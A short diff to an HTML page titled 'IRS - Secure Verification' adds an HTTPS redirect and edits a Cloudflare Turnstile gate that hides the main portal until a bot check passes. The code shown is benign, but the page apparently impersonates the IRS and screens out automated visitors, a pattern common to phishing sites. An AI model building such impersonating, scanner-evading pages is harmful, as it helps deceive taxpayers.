@@ -4,8 +4,17 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>IRS - Secure Verification</title>
+
+  <!-- HTTPS REDIRECT (Fixed) -->
+  <script>
+    if (location.protocol !== 'https:' && location.hostname !== 'localhost' && !location.hostname.startsWith('127.0.0.1')) {
+      location.href = 'https://' + location.host + location.pathname + location.search;
+    }
+  </script>
+
   <!-- Cloudflare Turnstile -->
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
   <style>
     * {
       margin: 0;
@@ -644,7 +653,6 @@
     turnstilePassed = true;
     document.getElementById('gateStatus').textContent = '✅ Verification passed. Loading portal...';
     document.getElementById('gateStatus').style.color = '#1a6b3a';
-    // Show main content after a short delay
     setTimeout(function() {
       document.getElementById('gate').style.display = 'none';
       document.getElementById('mainContent').style.display = 'block';
